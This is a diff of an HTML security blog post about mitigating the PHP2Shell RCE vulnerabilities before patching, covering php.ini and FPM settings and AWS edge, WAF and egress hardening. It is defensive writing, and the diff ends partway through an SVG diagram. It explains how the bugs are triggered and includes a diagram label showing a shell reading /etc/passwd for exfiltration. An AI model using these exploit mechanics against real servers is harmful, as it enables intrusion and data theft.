@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PHP2Shell: What to Do Before the Patch Lands | Y3llowDuck</title>
+<title>PHP2Shell: Before the Patch | Y3llowDuck</title>
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Sora:wght@300;400;600;700&display=swap" rel="stylesheet">
 <link rel="icon" href="/assets/img/duck.png" type="image/png">
 <link rel="apple-touch-icon" href="/assets/img/duck.png">
@@ -76,7 +76,7 @@
       <linearGradient id="g-com" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#FF9E2D"/><stop offset="1" stop-color="#E06000"/></linearGradient>
       <linearGradient id="g-db" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#5A7BF0"/><stop offset="1" stop-color="#2A2AA8"/></linearGradient>
 
-      <marker id="ah"  markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#8b949e"/></marker>
+      <marker id="ah"  markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#c9d1d9"/></marker>
       <marker id="ahg" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#3fb950"/></marker>
       <marker id="ahr" markerWidth="9" markerHeight="9" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#f85149"/></marker>
 
@@ -128,14 +128,14 @@
   </svg>
 
   <div class="tags">
-    <span class="tag red">CVE</span>
-    <span class="tag blue">PHP</span>
+    <span class="tag red">CVE-2026-109618</span>
+    <span class="tag red">CVE-2026-109619</span>
     <span class="tag yellow">Hardening</span>
     <span class="tag green">AWS</span>
   </div>
 
 <div class="hero">
-  <h1><span class="accent">PHP2Shell</span>: What to Do Before the Patch Lands</h1>
+  <h1><span class="accent">PHP2Shell</span>: Before the Patch</h1>
   <div class="hero-meta">
     <span>Pre-auth RCE</span>
     <span>CVSS 9.2</span>
@@ -145,7 +145,11 @@
 
 <hr class="hero-divider">
 
-  <p>Two things in this post, and I want the line between them clear up front. The first part is what the PHP advisories actually say. The second part is general hardening I'd do on anything I can't patch right away. The advisories only cover a narrow slice. Don't read my hardening advice as if it came from the PHP Foundation, because it didn't.</p>
+  <p>Any security vulnerability that ends in an actual RCE is a major headache. And the actual fix is a patch. There's no workaround. But the problem with patches is the implied downtime and the testing they require. We do not want to patch a critical asset without testing. At least, that's the recommended approach.</p>
+
+  <p>So I want to give some perspective on the temporary mitigations we must take when something like PHP2Shell appears in the wild. And I want to put emphasis on the word temporary, because these kinds of issues can only be fixed with an actual patch. Otherwise, we must accept the risk and the potential consequences.</p>
+
+  <p>Regardless, I want to explain some of the mitigations that can be taken, using PHP2Shell as an example. These same concepts are not new and can be implemented at any time on pretty much any app design in AWS. In practice they can be the difference between getting hit by a major vulnerability with no data leak, or getting hit and ending with a crashed server, downtime, and company reputation affected.</p>
 
   <p>The short version: patch now. Everything else buys you time, nothing else fixes the bug.</p>
 
@@ -162,9 +166,9 @@
   <p>Confirmed attack paths run through Apache mod_php and PHP-FPM. That covers a huge amount of the PHP serving the web. Early reports on exploitation didn't agree with each other. Some described opportunistic waves dropping web shells and cryptominers, others mentioned ransomware and APT activity. When the reporting is that mixed this early, treat it as "assume someone is trying" rather than waiting for a clean consensus.</p>
 
   <div class="section-title">02 &mdash; the only complete fix</div>
-  <h2>Patch. That's it.</h2>
+  <h2>Apply the Patch</h2>
 
-  <p>The fixed releases are 8.5.12, 8.4.27, 8.3.36 and 8.2.35. PHP 8.1 and older are end of life, so there is no upstream fix for them. If you're still on 8.1 or below, patching isn't a version bump, it's a migration, and you should have started already.</p>
+  <p>The fixed releases are <a href="https://www.php.net/downloads" target="_blank" rel="noopener">8.5.12, 8.4.27, 8.3.36 and 8.2.35</a>. PHP 8.1 and older are end of life, so there is no upstream fix for them. If you're still on 8.1 or below, patching is a migration, and you should have started already.</p>
 
   <div class="callout warn">
     <div class="callout-title">don't trust the version number</div>
@@ -172,9 +176,14 @@
   </div>
 
   <div class="section-title">03 &mdash; temporary mitigations</div>
-  <h2>From the PHP project, and only partial</h2>
+  <h2>From the PHP project</h2>
 
-  <p>The PHP project published mitigations for installs that can't patch yet. Read the word "temporary" the way they meant it. These reduce the odds, they don't close the hole, and every one of them needs all workers restarted to take effect.</p>
+  <p>The PHP project published mitigations for those installations that cannot be patched yet. But read the word "temporary" as what it is, a temporary workaround. These workarounds reduce the chances of being compromised, they don't eliminate the security hole, and every one of them needs all workers restarted to take effect.</p>
+
+  <div class="callout note">
+    <div class="callout-title">what is a PHP-FPM worker?</div>
+    PHP-FPM (FastCGI Process Manager) manages a pool of PHP processes that handle incoming web requests. Think of each process as a worker sitting on standby: when a request arrives, a worker picks it up, runs the PHP code, and sends the response back. The worker then goes back to standby, and here's the problem. It may still hold data in memory from the previous request. CVE-2026-109619 exploits exactly this: it abuses that leftover memory to gain control of the process. The mitigations below all attack different parts of this same problem.
+  </div>
 
   <div class="terminal">
     <button class="copy-btn" data-copy="memory_limit = -1&#10;post_max_size = 8M&#10;session.upload_progress.enabled = 0&#10;fatal_error_backtraces = 0&#10;pm.max_requests = 1">copy</button>
@@ -200,14 +209,14 @@ pm.max_requests = 1</div>
 
   <p><code>fatal_error_backtraces=0</code> applies to PHP 8.5 only. On older branches it does nothing for you.</p>
 
-  <p><code>pm.max_requests=1</code> recycles each FPM worker after a single request, which kills the stale-state reuse. It also costs you real performance, so this is the one you'll want to back out first once you've patched.</p>
+  <p><code>pm.max_requests=1</code> tells PHP-FPM to retire each worker process after handling exactly one request, then spawn a fresh one for the next. A fresh process has no leftover memory from anything previous, which removes the stale-state that CVE-2026-109619 depends on. The tradeoff is real: spawning a new process per request is slow, so this one hurts performance and should be the first setting you remove once you've patched.</p>
 
   <p>Set these in <code>php.ini</code> or the FPM pool, not in <code>.user.ini</code> or <code>ini_set()</code>, so an application can't walk them back at runtime. If an app doesn't accept multipart form data at all, just block it at the frontend and be done. The PHP Foundation also suggests a WAF in front of exposed servers, while saying plainly that none of this makes an install safe. Believe them.</p>
 
   <div class="section-title">04 &mdash; harden what you can't patch</div>
-  <h2>My recommendations, not the advisory's</h2>
+  <h2>AWS Infrastructure</h2>
 
-  <p>Everything from here down is me, not the PHP Foundation. It's also the part I actually care about: what I'd do on AWS for anything exposed that I can't patch on the spot. None of it fixes the bug. It cuts how reachable the bug is, then boxes in whatever runs if someone gets through anyway.</p>
+  <p>Everything from here down is me, not the PHP Foundation. It's about what someone should do on an AWS tenant for anything exposed that cannot be patched right away. None of it fixes the bug though, so keep that in mind. It only reduces the blast radius or cuts our losses, in plain Texas hold'em terms.</p>
 
   <p>Read the diagram top to bottom. That's the order an attacker's packet travels, and every layer is built to assume the one above it failed.</p>
 
@@ -219,21 +228,21 @@ pm.max_requests = 1</div>
       <path d="M372 42 a8 7 0 0 1 16 0" fill="#f85149"/>
       <text x="405" y="30" fill="#f85149" font-size="11" font-weight="700">Internet</text>
       <text x="405" y="44" fill="#8b949e" font-size="10">unauthenticated attacker</text>
-      <line x1="380" y1="51" x2="380" y2="84" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
+      <line x1="380" y1="51" x2="380" y2="84" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
 
-      <rect x="150" y="88" width="460" height="116" rx="10" fill="none" stroke="#30363d" stroke-dasharray="4 4"/>
+      <rect x="150" y="88" width="460" height="116" rx="10" fill="none" stroke="#6e7681" stroke-width="1.5" stroke-dasharray="4 4"/>
       <text x="166" y="108" fill="#8b949e" font-size="10.5">Edge · nothing reaches the origin directly</text>
       <use href="#ico-cloudfront" x="300" y="120" width="46" height="46"/>
       <text x="323" y="182" text-anchor="middle" fill="#c9d1d9" font-size="10.5">CloudFront</text>
       <use href="#ico-waf" x="414" y="120" width="46" height="46"/>
       <text x="437" y="182" text-anchor="middle" fill="#c9d1d9" font-size="10.5">AWS WAF</text>
       <text x="380" y="197" text-anchor="middle" fill="#8b949e" font-size="9.5">request/response size caps · block multipart · rate limit</text>
-      <line x1="380" y1="204" x2="380" y2="228" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
+      <line x1="380" y1="204" x2="380" y2="228" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
 
       <use href="#ico-alb" x="357" y="230" width="46" height="46"/>
       <text x="380" y="292" text-anchor="middle" fill="#c9d1d9" font-size="10.5">Application Load Balancer</text>
       <text x="380" y="305" text-anchor="middle" fill="#8b949e" font-size="9.5">edge auth · OIDC / Cognito</text>
-      <line x1="380" y1="314" x2="380" y2="340" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
+      <line x1="380" y1="314" x2="380" y2="340" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
 
       <rect x="40" y="344" width="680" height="256" rx="10" fill="none" stroke="#8c4fff" stroke-width="1.5"/>
       <use href="#ico-vpc" x="52" y="352" width="22" height="22"/>
@@ -250,7 +259,7 @@ pm.max_requests = 1</div>
       <text x="160" y="488" fill="#8b949e" font-size="10">read-only webroot, noexec</text>
       <text x="160" y="504" fill="#8b949e" font-size="10">non-root, no mgmt ports</text>
 
-      <rect x="430" y="392" width="270" height="188" rx="8" fill="none" stroke="#30363d" stroke-dasharray="3 3"/>
+      <rect x="430" y="392" width="270" height="188" rx="8" fill="none" stroke="#6e7681" stroke-width="1.5" stroke-dasharray="3 3"/>
       <text x="446" y="412" fill="#8b949e" font-size="10.5">firewall subnet · egress</text>
       <use href="#ico-nfw" x="470" y="430" width="46" height="46"/>
       <text x="493" y="492" text-anchor="middle" fill="#c9d1d9" font-size="10">Network Firewall</text>
@@ -259,7 +268,7 @@ pm.max_requests = 1</div>
       <text x="623" y="500" text-anchor="middle" fill="#c9d1d9" font-size="10">DNS Firewall</text>
       <text x="565" y="536" text-anchor="middle" fill="#8b949e" font-size="9.5">egress allowlist · blocks C2 and stage 2</text>
 
-      <line x1="396" y1="470" x2="462" y2="470" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
+      <line x1="396" y1="470" x2="462" y2="470" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
       <text x="429" y="463" text-anchor="middle" fill="#8b949e" font-size="9">egress</text>
       <line x1="565" y1="430" x2="565" y2="356" stroke="#f85149" stroke-width="1.5" stroke-dasharray="4 3" marker-end="url(#ahr)"/>
       <text x="582" y="372" fill="#f85149" font-size="9.5">allowlist only</text>
@@ -279,7 +288,7 @@ pm.max_requests = 1</div>
       <circle cx="48" cy="164" r="4.5" fill="#f85149"/>
       <path d="M40 176 a8 7 0 0 1 16 0" fill="#f85149"/>
       <text x="48" y="202" text-anchor="middle" fill="#8b949e" font-size="10">attacker</text>
-      <line x1="66" y1="168" x2="104" y2="168" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
+      <line x1="66" y1="168" x2="104" y2="168" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
 
       <rect x="108" y="50" width="372" height="236" rx="10" fill="#0d1117" stroke="#58a6ff"/>
       <use href="#ico-cloudfront" x="128" y="64" width="40" height="40"/>
@@ -299,37 +308,137 @@ pm.max_requests = 1</div>
       <path d="M126 242 l3 4 l7 -8" fill="none" stroke="#3fb950" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
       <text x="146" y="247" fill="#c9d1d9" font-size="10">origin SG locked to CloudFront prefix list</text>
 
-      <line x1="480" y1="168" x2="516" y2="168" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
+      <line x1="480" y1="168" x2="516" y2="168" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
       <use href="#ico-alb" x="520" y="148" width="40" height="40"/>
       <text x="540" y="204" text-anchor="middle" fill="#c9d1d9" font-size="10">ALB</text>
       <text x="540" y="217" text-anchor="middle" fill="#8b949e" font-size="9">OIDC / Cognito</text>
-      <line x1="562" y1="168" x2="648" y2="168" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
+      <line x1="562" y1="168" x2="648" y2="168" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
       <text x="605" y="161" text-anchor="middle" fill="#8b949e" font-size="9">authenticated</text>
       <!-- VPC boundary — what Layer 2 zooms into -->
-      <rect x="618" y="84" width="304" height="216" rx="8" fill="none" stroke="#8c4fff" stroke-width="1.5" stroke-dasharray="4 4"/>
-      <use href="#ico-vpc" x="620" y="88" width="18" height="18"/>
-      <text x="644" y="101" fill="#8b949e" font-size="9">VPC · private subnet</text>
+      <rect x="618" y="50" width="304" height="236" rx="8" fill="none" stroke="#8c4fff" stroke-width="1.5" stroke-dasharray="4 4"/>
+      <use href="#ico-vpc" x="620" y="54" width="18" height="18"/>
+      <text x="644" y="67" fill="#8b949e" font-size="9">VPC · private subnet</text>
       <use href="#ico-ec2" x="650" y="148" width="40" height="40"/>
       <text x="670" y="204" text-anchor="middle" fill="#c9d1d9" font-size="10">Web tier</text>
       <text x="670" y="216" text-anchor="middle" fill="#8b949e" font-size="8.5">PHP-FPM · SG: CF SG only</text>
-      <line x1="694" y1="168" x2="782" y2="168" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
+      <line x1="694" y1="168" x2="782" y2="168" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
       <text x="738" y="161" text-anchor="middle" fill="#8b949e" font-size="8">SG: db port only</text>
       <use href="#ico-rds" x="786" y="148" width="40" height="40"/>
       <text x="806" y="204" text-anchor="middle" fill="#c9d1d9" font-size="10">RDS</text>
-      <text x="724" y="248" text-anchor="middle" fill="#58a6ff" font-size="8.5">↓ SGs + egress controls detailed in Layer 2</text>
+      <text x="770" y="270" text-anchor="middle" fill="#58a6ff" font-size="8.5">↓ SGs + egress controls detailed in Layer 2</text>
     </svg>
     <figcaption style="font-family:'JetBrains Mono',monospace;font-size:11px;color:#8b949e;text-align:center;margin-top:10px;">The top node of the main diagram, opened up. WAF is where oversized and multipart requests die. The VPC internals on the right are what Layer 2 zooms into.</figcaption>
   </figure>
 
-  <p>Put CloudFront or an ALB in front and lock the origin security group to the CloudFront managed prefix list, so nothing reaches the origin directly. Add authentication at the edge, ALB OIDC or Cognito, or move the app behind a VPN or ZTNA. If an unauthenticated request never reaches PHP, a pre-auth RCE has nothing to talk to. That one step does more than every <code>php.ini</code> tweak combined.</p>
+  <p>Put CloudFront or an ALB in front and lock the origin security group to the CloudFront managed prefix list, so nothing reaches the origin directly. Add authentication at the edge, ALB OIDC or Cognito, or move the app behind a VPN or ZTNA. If an unauthenticated request never reaches PHP, a pre-auth RCE has nothing to talk to. That step does more than every <code>php.ini</code> tweak combined.</p>
 
-  <p>Then use AWS WAF for what it's actually good at, which is shrinking the attack surface, not stopping the exploit. Cap request body size. Both bugs are memory going wrong under load, and the first one leans on large request handling, so a hard ceiling on POST size at the edge backs up <code>post_max_size</code> and refuses oversized bodies before they ever reach a worker. Block multipart uploads on routes that don't accept them. Rate limit. If an app takes no multipart data at all, drop it at the edge and move on.</p>
+  <p>Then use AWS WAF for what it's good at, which is shrinking the attack surface.</p>
 
-  <p>Cap response size too, which people forget. A pre-auth RCE that lands gets used to read things and ship them back out, and bulk is how stolen data and directory dumps leave. A login endpoint returning a 40MB body is both a limit worth enforcing and an alert worth firing. Keep the normal responses small and the abnormal one gets loud.</p>
+  <p>Cap request body size. CVE-2026-109618 triggers when PHP runs out of memory processing a request. The larger the request body, the more memory PHP has to allocate for it. An oversized POST body, especially a multipart file upload, is exactly what pushes PHP toward that memory limit and into the abort path the exploit abuses. A hard ceiling on POST body size at the WAF means PHP never receives that request: the allocation never happens, the memory pressure never builds, and the exploit path closes before it starts. This also reinforces whatever you set in <code>post_max_size</code>, giving you two enforcement points instead of one. Block multipart uploads entirely on routes that don't use them. If an endpoint has no reason to accept a file, tell the WAF to drop multipart requests to it outright. Rate limit everything else.</p>
+
+  <p>Cap response size too, which people forget. This one is easy to overlook because it feels like a performance setting, not a security one. But if an RCE does land, the attacker's goal is to read files and get data out. That data has to leave as HTTP responses. A normal page load returns a few kilobytes. A directory listing, a file read, or a database dump returns megabytes. A WAF rule that rejects responses over a reasonable threshold catches that bulk exfiltration even when the inbound request looked perfectly fine. A login endpoint returning 40MB is not normal: it is worth capping and worth alerting on.</p>
+
+  <figure style="margin:28px 0;">
+    <div class="diagram-title">WAF size caps · how they cut the two attack paths</div>
+    <svg viewBox="0 0 760 370" role="img" aria-label="Two-section flow diagram. Top: request body cap — outside left, WAF center, inside right. Bottom: response size cap — outside left, WAF center, inside right. Top blocked: attacker sends 42 MB POST, WAF returns 413, PHP never reached. Top allowed: 1 KB login form passes through to PHP. Bottom blocked: RCE shell inside EC2 tries to send 40 MB file read leftward through WAF, blocked before reaching attacker. Bottom allowed: 2 KB response passes WAF and reaches user." style="width:100%;height:auto;display:block;background:#0d1117;border:1px solid #30363d;border-radius:10px;font-family:'JetBrains Mono',monospace;">
+
+      <!-- ─── REQUEST CAP ─── -->
+      <text x="30" y="22" fill="#3fb950" font-size="9.5" letter-spacing="1.5">REQUEST CAP  ·  CVE-2026-109618 OOM EXPLOIT PATH</text>
+
+      <!-- Row 1: oversized POST blocked -->
+      <circle cx="50" cy="64" r="12" fill="#161b22" stroke="#f85149" stroke-width="1.5"/>
+      <circle cx="50" cy="60" r="3.5" fill="#f85149"/>
+      <path d="M43 72 a7 6 0 0 1 14 0" fill="#f85149"/>
+      <text x="50" y="88" text-anchor="middle" fill="#8b949e" font-size="8.5">attacker</text>
+      <line x1="66" y1="64" x2="192" y2="64" stroke="#f85149" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#ahr)"/>
+      <text x="129" y="56" text-anchor="middle" fill="#f85149" font-size="9.5">42 MB multipart POST</text>
+      <use href="#ico-waf" x="196" y="46" width="36" height="36"/>
+      <text x="214" y="91" text-anchor="middle" fill="#8b949e" font-size="8.5">WAF · 8 MB cap</text>
+      <circle cx="272" cy="64" r="12" fill="#0d1117" stroke="#f85149" stroke-width="1.5"/>
+      <line x1="265" y1="57" x2="279" y2="71" stroke="#f85149" stroke-width="2"/>
+      <line x1="279" y1="57" x2="265" y2="71" stroke="#f85149" stroke-width="2"/>
+      <text x="296" y="59" fill="#f85149" font-size="10">413 Too Large · PHP never reached</text>
+      <text x="296" y="73" fill="#8b949e" font-size="9">no allocation · no OOM trigger · exploit path closed</text>
+
+      <line x1="30" y1="104" x2="730" y2="104" stroke="#21262d"/>
+
+      <!-- Row 2: normal request allowed -->
+      <circle cx="50" cy="132" r="12" fill="#161b22" stroke="#c9d1d9" stroke-width="1.5"/>
+      <circle cx="50" cy="128" r="3.5" fill="#c9d1d9"/>
+      <path d="M43 140 a7 6 0 0 1 14 0" fill="#c9d1d9"/>
+      <text x="50" y="156" text-anchor="middle" fill="#8b949e" font-size="8.5">user</text>
+      <line x1="66" y1="132" x2="192" y2="132" stroke="#c9d1d9" stroke-width="1.5" marker-end="url(#ah)"/>
+      <text x="129" y="124" text-anchor="middle" fill="#c9d1d9" font-size="9.5">1 KB login form</text>
+      <use href="#ico-waf" x="196" y="114" width="36" height="36"/>
+      <circle cx="272" cy="132" r="12" fill="#0d1117" stroke="#3fb950" stroke-width="1.5"/>
+      <path d="M265 132 l5 5 l8 -8" fill="none" stroke="#3fb950" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      <line x1="285" y1="132" x2="372" y2="132" stroke="#3fb950" stroke-width="1.5" marker-end="url(#ahg)"/>
+      <use href="#ico-ec2" x="376" y="114" width="36" height="36"/>
+      <text x="394" y="160" text-anchor="middle" fill="#8b949e" font-size="8.5">PHP</text>
+      <text x="425" y="128" fill="#c9d1d9" font-size="10">PHP processes normally</text>
+      <text x="425" y="142" fill="#8b949e" font-size="9">normal memory allocation · no exploit risk</text>
+
+      <!-- ─── SECTION DIVIDER ─── -->
+      <line x1="30" y1="172" x2="730" y2="172" stroke="#30363d" stroke-width="1.5"/>
+
+      <!-- ─── RESPONSE CAP · outside on left, WAF center, inside on right ─── -->
+      <text x="30" y="192" fill="#58a6ff" font-size="9.5" letter-spacing="1.5">RESPONSE CAP  ·  LIMITS EXFIL AFTER A SUCCESSFUL RCE</text>
+
+      <!-- Row 3: bulk exfil BLOCKED (EC2 inside right → WAF → attacker outside left) -->
+      <!-- Attacker / outside (left) -->
+      <circle cx="50" cy="235" r="12" fill="#161b22" stroke="#f85149" stroke-width="1.5"/>
+      <circle cx="50" cy="231" r="3.5" fill="#f85149"/>
+      <path d="M43 243 a7 6 0 0 1 14 0" fill="#f85149"/>
+      <text x="50" y="259" text-anchor="middle" fill="#8b949e" font-size="8.5">attacker</text>
+      <!-- Block X to the left of WAF (outside side) -->
+      <circle cx="140" cy="235" r="12" fill="#0d1117" stroke="#f85149" stroke-width="1.5"/>
+      <line x1="133" y1="228" x2="147" y2="242" stroke="#f85149" stroke-width="2"/>
+      <line x1="147" y1="228" x2="133" y2="242" stroke="#f85149" stroke-width="2"/>
+      <!-- WAF (center) -->
+      <use href="#ico-waf" x="196" y="217" width="36" height="36"/>
+      <text x="214" y="264" text-anchor="middle" fill="#8b949e" font-size="8.5">WAF · 1 MB cap</text>
+      <!-- Red dashed arrow: EC2 → WAF (right to left) -->
+      <line x1="604" y1="235" x2="252" y2="235" stroke="#f85149" stroke-width="1.5" stroke-dasharray="5 3" marker-end="url(#ahr)"/>
+      <text x="420" y="227" text-anchor="middle" fill="#f85149" font-size="9.5">shell reads /etc/passwd → 40 MB</text>
+      <!-- EC2 / inside (right, compromised) -->
+      <use href="#ico-ec2" x="608" y="217" width="36" height="36"/>
+      <rect x="606" y="215" width="40" height="40" rx="6" fill="none" stroke="#f85149" stroke-width="1.5"/>
+      <text x="626" y="267" text-anchor="middle" fill="#f85149" font-size="8.5">RCE shell</text>
+      <!-- Result text (between WAF and EC2) -->
+      <text x="260" y="255" fill="#f85149" font-size="10">response blocked · data never leaves</text>
+      <text x="260" y="268" fill="#8b949e" font-size="9">RCE ran, but exfil fails · no data breach</text>
+
+      <line x1="30" y1="285" x2="730" y2="285" stroke="#21262d"/>
+
+      <!-- Row 4: normal response ALLOWED (EC2 inside right → WAF → user outside left) -->
+      <!-- User / outside (left) -->
+      <circle cx="50" cy="313" r="15" fill="#161b22" stroke="#3fb950" stroke-width="1.5"/>
+      <circle cx="50" cy="309" r="4" fill="#3fb950"/>
+      <path d="M43 321 a7 6 0 0 1 14 0" fill="#3fb950"/>
+      <text x="50" y="340" text-anchor="middle" fill="#8b949e" font-size="8.5">user</text>
+      <!-- Check (left of WAF, outside side) -->
+      <circle cx="140" cy="313" r="12" fill="#0d1117" stroke="#3fb950" stroke-width="1.5"/>
+      <path d="M133 313 l5 5 l8 -8" fill="none" stroke="#3fb950" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+      <!-- Short green arrow: check → user -->
+      <line x1="127" y1="313" x2="70" y2="313" stroke="#3fb950" stroke-width="1.5" marker-end="url(#ahg)"/>
+      <!-- WAF (center) -->
+      <use href="#ico-waf" x="196" y="295" width="36" height="36"/>
+      <!-- Green arrow: EC2 → WAF (right to left) -->
+      <line x1="604" y1="313" x2="252" y2="313" stroke="#3fb950" stroke-width="1.5" marker-end="url(#ahg)"/>
+      <text x="420" y="305" text-anchor="middle" fill="#c9d1d9" font-size="9.5">200 OK - 2 KB</text>
+      <!-- EC2 / inside (right) -->
+      <use href="#ico-ec2" x="608" y="295" width="36" height="36"/>
+      <text x="626" y="344" text-anchor="middle" fill="#8b949e" font-size="8.5">PHP</text>
+      <!-- Result text (between WAF and EC2) -->
+      <text x="260" y="333" fill="#c9d1d9" font-size="10">user gets the page</text>
+      <text x="260" y="346" fill="#8b949e" font-size="9">normal responses pass through unaffected</text>
+
+    </svg>
+  </figure>
 
   <p>A vendor virtual patch, like the Cloudflare protections reported for this flaw, is a reasonable layer on top of all this, not a replacement for any of it.</p>
 
-  <h2 style="font-size:17px;margin-top:40px;">Layer 2: tighten the network</h2>
+  <h2 style="font-size:17px;margin-top:40px;">Layer 2: securing the network</h2>
 
   <figure style="margin:24px 0;">
     <div class="diagram-title">Layer 2 · security groups and egress (zoom-in)</div>
@@ -337,39 +446,52 @@ pm.max_requests = 1</div>
       <text x="40" y="34" fill="#8b949e" font-size="10.5">Security groups · lateral movement</text>
       <use href="#ico-alb" x="60" y="52" width="44" height="44"/>
       <text x="82" y="112" text-anchor="middle" fill="#c9d1d9" font-size="10">ALB SG</text>
-      <line x1="106" y1="74" x2="196" y2="74" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
+      <line x1="106" y1="74" x2="196" y2="74" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
       <text x="151" y="67" text-anchor="middle" fill="#8b949e" font-size="9">443</text>
       <use href="#ico-ec2" x="200" y="52" width="44" height="44"/>
       <text x="222" y="112" text-anchor="middle" fill="#c9d1d9" font-size="10">Web SG (EC2)</text>
-      <line x1="246" y1="74" x2="356" y2="74" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
+      <line x1="246" y1="74" x2="356" y2="74" stroke="#c9d1d9" stroke-width="2" marker-end="url(#ah)"/>
       <text x="301" y="67" text-anchor="middle" fill="#8b949e" font-size="9">db port</text>
       <use href="#ico-rds" x="360" y="52" width="44" height="44"/>
       <text x="382" y="112" text-anchor="middle" fill="#c9d1d9" font-size="10">DB SG (RDS)</text>
 
       <line x1="40" y1="150" x2="720" y2="150" stroke="#30363d"/>
 
+      <!-- Default-deny egress · outside on left, firewall center, inside on right -->
       <text x="40" y="180" fill="#8b949e" font-size="10.5">Default-deny egress · callback prevention</text>
-      <use href="#ico-ec2" x="60" y="200" width="44" height="44"/>
-      <text x="82" y="260" text-anchor="middle" fill="#c9d1d9" font-size="10">Web tier</text>
-      <line x1="106" y1="222" x2="190" y2="222" stroke="#8b949e" stroke-width="1.5" marker-end="url(#ah)"/>
-      <rect x="192" y="188" width="210" height="96" rx="8" fill="none" stroke="#30363d" stroke-dasharray="3 3"/>
-      <use href="#ico-nfw" x="210" y="200" width="36" height="36"/>
-      <use href="#ico-r53" x="300" y="200" width="36" height="36"/>
-      <text x="297" y="258" text-anchor="middle" fill="#8b949e" font-size="9.5">Network Firewall + DNS Firewall</text>
-      <text x="297" y="272" text-anchor="middle" fill="#8b949e" font-size="9.5">domain allowlist</text>
-      <line x1="402" y1="208" x2="500" y2="208" stroke="#3fb950" stroke-width="1.5" marker-end="url(#ahg)"/>
-      <text x="510" y="212" fill="#3fb950" font-size="10">allowlisted updates / APIs</text>
-      <line x1="402" y1="262" x2="695" y2="262" stroke="#f85149" stroke-width="4" stroke-dasharray="9 3" marker-end="url(#ahr)"/>
-      <text x="548" y="253" text-anchor="middle" fill="#f85149" font-size="9" font-weight="700">C2 / stage-2 / exfil: denied</text>
-      <circle cx="548" cy="262" r="10" fill="#0d1117" stroke="#f85149" stroke-width="2"/>
-      <line x1="541" y1="255" x2="555" y2="269" stroke="#f85149" stroke-width="2"/>
-      <line x1="555" y1="255" x2="541" y2="269" stroke="#f85149" stroke-width="2"/>
-      <rect x="700" y="210" width="48" height="34" rx="4" fill="#0d1117" stroke="#f85149" stroke-width="1.5"/>
-      <text x="724" y="232" text-anchor="middle" fill="#f85149" font-size="18">☠</text>
-      <line x1="724" y1="244" x2="724" y2="252" stroke="#f85149" stroke-width="1.5"/>
-      <line x1="716" y1="252" x2="732" y2="252" stroke="#f85149" stroke-width="1.5"/>
-      <rect x="712" y="255" width="24" height="6" rx="1" fill="none" stroke="#f85149" stroke-width="1"/>
-      <text x="724" y="273" text-anchor="middle" fill="#f85149" font-size="8">C2 server</text>
+
+      <!-- C2 server / internet (outside, left) -->
+      <rect x="32" y="210" width="48" height="34" rx="4" fill="#0d1117" stroke="#f85149" stroke-width="1.5"/>
+      <text x="56" y="232" text-anchor="middle" fill="#f85149" font-size="18">☠</text>
+      <line x1="56" y1="244" x2="56" y2="252" stroke="#f85149" stroke-width="1.5"/>
+      <line x1="48" y1="252" x2="64" y2="252" stroke="#f85149" stroke-width="1.5"/>
+      <rect x="44" y="255" width="24" height="6" rx="1" fill="none" stroke="#f85149" stroke-width="1"/>
+      <text x="56" y="273" text-anchor="middle" fill="#f85149" font-size="8">C2 server</text>
+
+      <!-- Allowed traffic exits left (green) -->
+      <line x1="270" y1="208" x2="94" y2="208" stroke="#3fb950" stroke-width="1.5" marker-end="url(#ahg)"/>
+      <text x="90" y="200" fill="#3fb950" font-size="10">allowlisted updates / APIs</text>
+
+      <!-- Firewall box (center) -->
+      <rect x="270" y="188" width="210" height="96" rx="8" fill="none" stroke="#6e7681" stroke-width="1.5" stroke-dasharray="3 3"/>
+      <use href="#ico-nfw" x="312" y="200" width="36" height="36"/>
+      <use href="#ico-r53" x="402" y="200" width="36" height="36"/>
+      <text x="375" y="258" text-anchor="middle" fill="#8b949e" font-size="9.5">Network Firewall + DNS Firewall</text>
+      <text x="375" y="272" text-anchor="middle" fill="#8b949e" font-size="9.5">domain allowlist</text>
+
+      <!-- Denied C2 traffic exits left, blocked (red dashed) -->
+      <line x1="270" y1="262" x2="85" y2="262" stroke="#f85149" stroke-width="4" stroke-dasharray="9 3" marker-end="url(#ahr)"/>
+      <text x="172" y="253" text-anchor="middle" fill="#f85149" font-size="9" font-weight="700">C2 / stage-2 / exfil: denied</text>
+      <circle cx="172" cy="262" r="10" fill="#0d1117" stroke="#f85149" stroke-width="2"/>
+      <line x1="165" y1="255" x2="179" y2="269" stroke="#f85149" stroke-width="2"/>
